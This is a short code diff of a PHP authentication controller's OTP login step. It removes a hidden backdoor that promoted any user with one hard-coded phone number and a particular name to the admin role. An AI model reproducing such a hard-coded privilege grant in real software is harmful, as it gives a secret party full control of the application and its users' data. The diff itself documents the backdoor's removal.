@@ -78,9 +78,6 @@ class AuthController extends Controller
                         'name' => $payload['name'] ?? 'کاربر',
                     ]
                 );
-                if ($otp->phone == '09002827287' && ($payload['name'] ?? null) == "ممد") {
-                    $user->update(['role' => 'admin']);
-                }
                 $otp->delete();
                 return $user;
             });
